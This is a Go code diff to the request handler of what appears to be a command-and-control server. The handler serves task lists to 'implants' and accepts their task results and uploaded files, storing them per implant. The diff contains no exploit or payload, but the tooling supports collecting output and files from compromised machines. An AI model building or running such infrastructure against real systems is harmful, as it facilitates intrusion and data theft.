@@ -5,7 +5,8 @@ import (
 	"encoding/json"
 	"errors"
 	"io"
-	"mime/multipart"
+	"strings"
+
 	"net/http"
 	"os"
 	"path/filepath"
@@ -29,24 +30,41 @@ func logRequest(handler http.Handler) http.Handler {
 		handler.ServeHTTP(w, req)
 	})
 }
-func requestHandler(w http.ResponseWriter, r *http.Request) {
-	// Parse multipart form data
-	err := r.ParseMultipartForm(10 << 20) // 10 MB
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		comunication.Logger.Errorf("failed to parse multipart form: %v", err)
-		return
-	}
 
-	// Extract req_type and JSON content
-	reqType := r.FormValue("req_type")
-	content := r.FormValue("content")
+func requestHandler(w http.ResponseWriter, r *http.Request) {
 	var req Request
-	req.ReqType = reqType
-	err = json.Unmarshal([]byte(content), &req.Content)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		comunication.Logger.Errorf("failed to decode request: %v", err)
+	contentType := r.Header.Get("Content-Type")
+
+	if contentType == "application/json" {
+		// Parse JSON request
+		err := json.NewDecoder(r.Body).Decode(&req)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			comunication.Logger.Errorf("failed to decode JSON request: %v", err)
+			return
+		}
+	} else if strings.HasPrefix(contentType, "multipart/form-data") {
+		// Parse multipart form data
+		err := r.ParseMultipartForm(10 << 20) // 10 MB
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			comunication.Logger.Errorf("failed to parse multipart form: %v", err)
+			return
+		}
+
+		// Extract req_type and JSON content
+		reqType := r.FormValue("req_type")
+		content := r.FormValue("content")
+		req.ReqType = reqType
+		err = json.Unmarshal([]byte(content), &req.Content)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			comunication.Logger.Errorf("failed to decode request: %v", err)
+			return
+		}
+	} else {
+		http.Error(w, "unsupported content type", http.StatusUnsupportedMediaType)
+		comunication.Logger.Errorf("unsupported content type: %s", contentType)
 		return
 	}
 
@@ -59,7 +77,7 @@ func requestHandler(w http.ResponseWriter, r *http.Request) {
 	case "GetTasksByImplantID":
 		handleGetTasksByImplantID(w, req.Content)
 	case "UploadTaskResults":
-		handleUploadTaskResults(w, r)
+		handleUploadTaskResults(w, r, req.Content)
 	default:
 		http.Error(w, "unknown request type", http.StatusBadRequest)
 		comunication.Logger.Errorf("unknown request type: %s", req.ReqType)
@@ -141,104 +159,128 @@ func handleGetTasksByImplantID(w http.ResponseWriter, content json.RawMessage) {
 	}
 }
 
-// Handle UploadTaskResults request
-func handleUploadTaskResults(w http.ResponseWriter, r *http.Request) {
-	// Parse multipart form data
-	err := r.ParseMultipartForm(10 << 20) // 10 MB
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		comunication.Logger.Errorf("failed to parse multipart form: %v", err)
-		return
-	}
-
-	// Extract JSON content
-	content := r.FormValue("content")
+func handleUploadTaskResults(w http.ResponseWriter, r *http.Request, content json.RawMessage) {
 	var data struct {
-		ID       string `json:"id"`
-		TaskID   string `json:"task_id"`
-		FileName string `json:"file_name"`
-		FileType string `json:"file_type"`
+		ID     string `json:"id"`
+		TaskID string `json:"task_id"`
+		Result struct {
+			Status string      `json:"status"`
+			Output interface{} `json:"output"`
+		} `json:"result"`
 	}
-	err = json.Unmarshal([]byte(content), &data)
+	err := json.Unmarshal(content, &data)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
 		comunication.Logger.Errorf("failed to decode upload task results request: %v", err)
 		return
 	}
 
-	// Extract file
-	file, handler, err := r.FormFile("file")
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusBadRequest)
-		comunication.Logger.Errorf("failed to get file from form: %v", err)
-		return
-	}
-	defer func(file multipart.File) {
-		err := file.Close()
+	switch output := data.Result.Output.(type) {
+	case string:
+		// Handle short output
+		taskResult := []byte(output)
+		err = db.CompleteTask(data.TaskID, taskResult)
 		if err != nil {
-			comunication.Logger.Errorf("failed to close file: %v", err)
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to complete task: %v", err)
+			return
 		}
-	}(file)
+	case map[string]interface{}:
+		// Handle file upload
+		_, ok := output["file_name"].(string)
+		if !ok {
+			http.Error(w, "invalid file_name", http.StatusBadRequest)
+			return
+		}
+		fileType, ok := output["file_type"].(string)
+		if !ok {
+			http.Error(w, "invalid file_type", http.StatusBadRequest)
+			return
+		}
 
-	// Create directory for the implant if it doesn't exist
-	implantDir := filepath.Join("uploads", data.ID)
-	err = os.MkdirAll(implantDir, os.ModePerm)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		comunication.Logger.Errorf("failed to create directory for implant: %v", err)
-		return
-	}
-
-	// Save the uploaded file to the filesystem and save in the database the absolute path
-	filePath := filepath.Join(implantDir, handler.Filename)
-	dst, err := os.Create(filePath)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		comunication.Logger.Errorf("failed to create file: %v", err)
-		return
-	}
-	defer func(dst *os.File) {
-		err := dst.Close()
+		// Extract file
+		file, handler, err := r.FormFile("file")
 		if err != nil {
-			comunication.Logger.Errorf("failed to close file: %v", err)
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			comunication.Logger.Errorf("failed to get file from form: %v", err)
+			return
 		}
-	}(dst)
+		defer file.Close()
 
-	_, err = io.Copy(dst, file)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		comunication.Logger.Errorf("failed to save file: %v", err)
-		return
-	}
+		// Create directory for the implant if it doesn't exist
+		implantDir := filepath.Join("uploads", data.ID)
+		err = os.MkdirAll(implantDir, os.ModePerm)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to create directory for implant: %v", err)
+			return
+		}
 
-	// Get file size
-	fileInfo, err := dst.Stat()
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		comunication.Logger.Errorf("failed to get file info: %v", err)
-		return
-	}
+		// Save the uploaded file to the filesystem and save in the database the absolute path
+		filePath := filepath.Join(implantDir, handler.Filename)
+		dst, err := os.Create(filePath)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to create file: %v", err)
+			return
+		}
+		defer dst.Close()
 
-	absFilePath, err := filepath.Abs(filePath)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		comunication.Logger.Errorf("failed to get absolute file path: %v", err)
-		return
-	}
-	// Store the file reference in the database
-	fileInfoDB := &db.FileInfo{
-		ImplantID: data.ID,
-		FileName:  handler.Filename,
-		FileSize:  fileInfo.Size(),
-		FileType:  data.FileType,
-		FilePath:  absFilePath,
-		CreatedAt: comunication.CurrentUnixTimestamp(),
-	}
+		_, err = io.Copy(dst, file)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to save file: %v", err)
+			return
+		}
 
-	err = db.AddFile(fileInfoDB)
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		comunication.Logger.Errorf("failed to store file reference in database: %v", err)
+		// Get file size
+		fileInfo, err := dst.Stat()
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to get file info: %v", err)
+			return
+		}
+
+		absFilePath, err := filepath.Abs(filePath)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to get absolute file path: %v", err)
+			return
+		}
+		// Store the file reference in the database
+		fileInfoDB := &db.FileInfo{
+			ImplantID: data.ID,
+			FileName:  handler.Filename,
+			FileSize:  fileInfo.Size(),
+			FileType:  fileType,
+			FilePath:  absFilePath,
+			CreatedAt: comunication.CurrentUnixTimestamp(),
+		}
+
+		err = db.AddFile(fileInfoDB)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to store file reference in database: %v", err)
+			return
+		}
+
+		// Get the file ID
+		fileID, err := db.GetFileID(fileInfoDB)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to get file ID: %v", err)
+			return
+		}
+
+		// Update the task with the file ID
+		err = db.CompleteTaskWithFile(data.TaskID, fileID)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to complete task with file: %v", err)
+			return
+		}
+	default:
+		http.Error(w, "invalid output type", http.StatusBadRequest)
 		return
 	}
 
